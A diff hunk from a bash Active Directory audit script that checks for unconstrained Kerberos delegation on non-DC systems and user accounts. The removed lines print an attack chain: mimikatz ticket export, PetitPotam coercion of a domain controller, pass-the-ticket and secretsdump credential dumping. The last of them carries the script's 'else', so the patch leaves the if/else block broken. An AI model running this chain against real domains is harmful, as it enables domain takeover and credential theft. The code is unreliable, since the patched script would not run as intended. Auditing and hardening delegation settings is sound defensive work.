@@ -512,19 +512,12 @@ if [ "$NON_DC_COUNT" -gt 0 ]; then
     [ ! -z "$system" ] && echo -e "${RED}       └─ $system${NC}"
   done <<< "$NON_DC_UNCON"
   FIRST_NON_DC_UNCON=$(echo "$NON_DC_UNCON" | head -1 | tr -d ' ')
-  echo -e "${GREY}          1) $FIRST_NON_DC_UNCON: mimikatz sekurlsa::tickets /export${NC}"
-  echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <HOST_IP> $DC_IP${NC}"
-  echo -e "${GREY}          3) mimikatz: kerberos::ptt <DC_TGT>.kirbi${NC}"
-  echo -e "${GREY}          4) secretsdump.py -k -no-pass '$DOMAIN/${DC_HOSTNAME}\$@$DC_FQDN'${NC}"else
   echo -e "${GREEN}[OK] No Unconstrained Delegation on non-DC systems${NC}"
 fi
 
 # Unconstrained Delegation - User
-UNCON_USERS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
-  -b "$DOMAIN_DN" \
-  "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
+UNCON_USERS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
   sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
-
 UNCON_USER_COUNT=$(echo "$UNCON_USERS" | grep -v "^$" | wc -l)
 
 if [ "$UNCON_USER_COUNT" -gt 0 ]; then
